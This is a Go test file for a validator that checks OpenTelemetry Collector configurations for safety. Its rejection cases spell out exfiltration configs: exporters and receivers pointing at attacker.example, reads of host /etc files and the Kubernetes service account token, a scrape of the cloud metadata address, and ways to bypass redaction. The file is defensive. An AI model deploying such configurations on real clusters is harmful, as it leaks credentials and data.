package main

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestCollectorSemanticSafetyAcceptsHelmManagedProfiles(t *testing.T) {
	_, currentFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("cannot locate collector security test file")
	}
	repositoryRoot := filepath.Clean(filepath.Join(filepath.Dir(currentFile), "../../../../.."))
	for _, name := range []string{"values-infra.yaml", "values-infra-gateway.yaml"} {
		t.Run(name, func(t *testing.T) {
			body, err := os.ReadFile(filepath.Join(repositoryRoot, "k8s/addons/opentelemetry", name))
			if err != nil {
				t.Fatalf("cannot read Helm values: %v", err)
			}
			var values struct {
				Collector struct {
					ManagedConfig map[string]any `yaml:"managedConfig"`
				} `yaml:"collector"`
			}
			if err := yaml.Unmarshal(body, &values); err != nil {
				t.Fatalf("cannot decode Helm values: %v", err)
			}
			managedConfig, err := yaml.Marshal(values.Collector.ManagedConfig)
			if err != nil {
				t.Fatalf("cannot encode managed Collector config: %v", err)
			}
			if err := validateCollectorConfigSafety(string(managedConfig)); err != nil {
				t.Fatalf("deployed managed profile rejected: %v", err)
			}
		})
	}
}

func TestCollectorSemanticSafetyAcceptsManagedProfiles(t *testing.T) {
	tests := map[string]string{
		"gateway": `
extensions:
  health_check: {endpoint: 0.0.0.0:13133}
receivers:
  otlp:
    protocols:
      grpc: {endpoint: 0.0.0.0:4317}
      http: {endpoint: 0.0.0.0:4318}
processors:
  memory_limiter: {limit_mib: 512}
  redaction/central:
    allow_all_keys: true
    redact_all_types: true
    blocked_key_patterns: ['(?i)authorization|token']
    blocked_values: ['(?i)bearer\\s+.++']
    summary: silent
  batch: {}
exporters:
  otlp_grpc/tempo: {endpoint: tempo.o11y-backends.svc.cluster.local:4317}
service:
  telemetry:
    logs:
      level: info
      output_paths: [stdout]
      error_output_paths: [stderr]
      sampling: {enabled: true, initial: 10, thereafter: 100, tick: 10s}
    metrics:
      level: Normal
      readers:
        - pull:
            exporter:
              prometheus:
                host: localhost
                port: 8888
                without_scope_info: true
                without_type_suffix: true
  pipelines:
    traces:
      receivers: [otlp]
      processors: [memory_limiter, redaction/central, batch]
      exporters: [otlp_grpc/tempo]
`,
		"monitoring": `
extensions:
  k8s_leader_elector/cluster:
    auth_type: serviceAccount
    lease_name: o11y-infra-monitoring
    lease_namespace: o11y
receivers:
  filelog/pods:
    include: [/var/log/pods/*/*/*.log]
    exclude: [/var/log/pods/o11y_otel-monitoring-*_*/*/*.log]
  hostmetrics: {root_path: /hostfs}
  kubeletstats:
    auth_type: serviceAccount
    collection_interval: 20s
    endpoint: ${env:K8S_NODE_IP}:10250
    metric_groups: [node, pod, container, volume]
  k8s_cluster:
    auth_type: serviceAccount
    k8s_leader_elector: k8s_leader_elector/cluster
  k8s_objects/events:
    auth_type: serviceAccount
    k8s_leader_elector: k8s_leader_elector/cluster
    objects:
      - {name: events, group: events.k8s.io, mode: watch}
  prometheus/monitors:
    target_allocator: {endpoint: http://otel-target-allocator.o11y.svc.cluster.local}
processors:
  batch: {}
exporters:
  otlp_http/gateway: {endpoint: http://otel-gateway.o11y.svc.cluster.local:4318}
service:
  pipelines:
    metrics:
      receivers: [hostmetrics, kubeletstats, k8s_cluster, prometheus/monitors]
      processors: [batch]
      exporters: [otlp_http/gateway]
    logs:
      receivers: [filelog/pods, k8s_objects/events]
      processors: [batch]
      exporters: [otlp_http/gateway]
`,
		"immutable base": `
extensions: {health_check: {endpoint: 0.0.0.0:13133}}
receivers: {nop: {}}
exporters: {nop: {}}
service:
  extensions: [health_check]
  pipelines:
    traces: {receivers: [nop], exporters: [nop]}
    metrics: {receivers: [nop], exporters: [nop]}
    logs: {receivers: [nop], exporters: [nop]}
`,
	}
	for name, body := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateCollectorConfigSafety(body); err != nil {
				t.Fatalf("managed profile rejected: %v", err)
			}
		})
	}
}

func TestCollectorSemanticSafetyRejectsExfiltrationPrimitives(t *testing.T) {
	tests := map[string]string{
		"external exporter": `exporters: {otlphttp/evil: {endpoint: https://attacker.example/upload}}`,
		"debug exporter":    `exporters: {debug: {verbosity: detailed}}`,
		"file exporter":     `exporters: {file/evil: {path: /tmp/stolen.json}}`,
		"host filelog":      `receivers: {filelog/evil: {include: [/hostfs/etc/*]}}`,
		"service token":     `receivers: {filelog/evil: {include: [/var/run/secrets/kubernetes.io/serviceaccount/token]}}`,
		"inline scrape":     `receivers: {prometheus/evil: {config: {scrape_configs: [{static_configs: [{targets: [169.254.169.254]}]}]}}}`,
		"HTTP extension":    `extensions: {oauth2client/evil: {endpoint_params: {audience: test}}}`,
		"connector":         `connectors: {forward: {}}`,
		"second document":   "receivers: {nop: {}}\n---\nexporters: {nop: {}}\n",
	}
	for name, body := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateCollectorConfigSafety(body); err == nil {
				t.Fatalf("unsafe configuration %q was accepted", name)
			}
		})
	}
}

func TestCollectorSemanticSafetyRequiresGatewayRedaction(t *testing.T) {
	body := `
receivers:
  otlp: {protocols: {http: {endpoint: 0.0.0.0:4318}}}
processors: {batch: {}}
exporters:
  otlp_grpc/tempo: {endpoint: tempo.o11y-backends.svc.cluster.local:4317}
service:
  pipelines:
    traces: {receivers: [otlp], processors: [batch], exporters: [otlp_grpc/tempo]}
`
	err := validateCollectorConfigSafety(body)
	if err == nil || !strings.Contains(err.Error(), "redaction") {
		t.Fatalf("gateway without redaction was accepted: %v", err)
	}
}

func TestCollectorSemanticSafetyRejectsIneffectiveGatewayRedaction(t *testing.T) {
	base := func(redaction, processorReference string) string {
		return `
receivers:
  otlp: {protocols: {http: {endpoint: 0.0.0.0:4318}}}
processors:
  redaction/central: ` + redaction + `
exporters:
  otlp_grpc/tempo: {endpoint: tempo.o11y-backends.svc.cluster.local:4317}
service:
  pipelines:
    traces:
      receivers: [otlp]
      processors: [` + processorReference + `]
      exporters: [otlp_grpc/tempo]
`
	}
	tests := map[string]string{
		"allow all keys disabled": base(`
    allow_all_keys: false
    redact_all_types: true
    blocked_key_patterns: [token]
    blocked_values: [secret]
    summary: silent`, "redaction/central"),
		"all types disabled": base(`
    allow_all_keys: true
    redact_all_types: false
    blocked_key_patterns: [token]
    blocked_values: [secret]
    summary: silent`, "redaction/central"),
		"empty blocked keys": base(`
    allow_all_keys: true
    redact_all_types: true
    blocked_key_patterns: []
    blocked_values: [secret]
    summary: silent`, "redaction/central"),
		"empty blocked values": base(`
    allow_all_keys: true
    redact_all_types: true
    blocked_key_patterns: [token]
    blocked_values: []
    summary: silent`, "redaction/central"),
		"summary leaks": base(`
    allow_all_keys: true
    redact_all_types: true
    blocked_key_patterns: [token]
    blocked_values: [secret]
    summary: debug`, "redaction/central"),
		"ignored keys bypass": base(`
    allow_all_keys: true
    redact_all_types: true
    blocked_key_patterns: [token]
    blocked_values: [secret]
    ignored_key_patterns: ['.*']
    summary: silent`, "redaction/central"),
		"unconfigured reference": base(`
    allow_all_keys: true
    redact_all_types: true
    blocked_key_patterns: [token]
    blocked_values: [secret]
    summary: silent`, "redaction/missing"),
	}
	for name, body := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateCollectorConfigSafety(body); err == nil {
				t.Fatalf("ineffective redaction %q was accepted", name)
			}
		})
	}
}

func TestCollectorSemanticSafetyRejectsUnsafeOTLPReceiver(t *testing.T) {
	tests := map[string]string{
		"no protocols":       `receivers: {otlp: {}}`,
		"unsupported thrift": `receivers: {otlp: {protocols: {thrift: {endpoint: 0.0.0.0:4317}}}}`,
		"wrong grpc port":    `receivers: {otlp: {protocols: {grpc: {endpoint: 0.0.0.0:55680}}}}`,
		"remote HTTP bind":   `receivers: {otlp: {protocols: {http: {endpoint: collector.example:4318}}}}`,
		"TLS file option":    `receivers: {otlp: {protocols: {grpc: {endpoint: 0.0.0.0:4317, tls: {cert_file: /etc/tls/tls.crt}}}}}`,
	}
	for name, body := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateCollectorConfigSafety(body); err == nil {
				t.Fatalf("unsafe OTLP receiver %q was accepted", name)
			}
		})
	}
}

func TestCollectorSemanticSafetyRejectsUnsafeKubernetesReceivers(t *testing.T) {
	leader := `
extensions:
  k8s_leader_elector/cluster:
    auth_type: serviceAccount
    lease_name: o11y-infra-monitoring
    lease_namespace: o11y
`
	tests := map[string]string{
		"leader wrong namespace": strings.Replace(leader, "lease_namespace: o11y", "lease_namespace: kube-system", 1),
		"leader wrong auth":      strings.Replace(leader, "auth_type: serviceAccount", "auth_type: kubeConfig", 1),
		"kubelet remote endpoint": `receivers:
  kubeletstats:
    auth_type: serviceAccount
    endpoint: attacker.example:10250
    metric_groups: [node, pod, container, volume]
`,
		"kubelet bearer auth": `receivers:
  kubeletstats:
    auth_type: tls
    endpoint: ${env:K8S_NODE_IP}:10250
    metric_groups: [node, pod, container, volume]
`,
		"kubelet missing group": `receivers:
  kubeletstats:
    auth_type: serviceAccount
    endpoint: ${env:K8S_NODE_IP}:10250
    metric_groups: [node, pod, container]
`,
		"kubelet extra group": `receivers:
  kubeletstats:
    auth_type: serviceAccount
    endpoint: ${env:K8S_NODE_IP}:10250
    metric_groups: [node, pod, container, volume, node]
`,
		"events wrong group": leader + `receivers:
  k8s_objects/events:
    auth_type: serviceAccount
    k8s_leader_elector: k8s_leader_elector/cluster
    objects: [{name: secrets, group: v1, mode: watch}]
`,
		"events list mode": leader + `receivers:
  k8s_objects/events:
    auth_type: serviceAccount
    k8s_leader_elector: k8s_leader_elector/cluster
    objects: [{name: events, group: events.k8s.io, mode: pull}]
`,
		"events missing leader": `receivers:
  k8s_objects/events:
    auth_type: serviceAccount
    k8s_leader_elector: k8s_leader_elector/missing
    objects: [{name: events, group: events.k8s.io, mode: watch}]
`,
	}
	for name, body := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateCollectorConfigSafety(body); err == nil {
				t.Fatalf("unsafe Kubernetes receiver %q was accepted", name)
			}
		})
	}
}

func TestCollectorSemanticSafetyRejectsRemoteOrFileTelemetry(t *testing.T) {
	tests := map[string]string{
		"file log": `service: {telemetry: {logs: {output_paths: [/tmp/collector.log]}}}`,
		"remote metrics": `service:
  telemetry:
    metrics:
      readers:
        - pull:
            exporter:
              prometheus: {host: 0.0.0.0, port: 8888}
`,
		"push reader":       `service: {telemetry: {metrics: {readers: [{periodic: {exporter: {otlp: {endpoint: attacker.example:4317}}}}]}}}`,
		"resource identity": `service: {telemetry: {resource: {service.instance.id: stolen}}}`,
	}
	for name, body := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateCollectorConfigSafety(body); err == nil {
				t.Fatalf("unsafe service telemetry %q was accepted", name)
			}
		})
	}
}
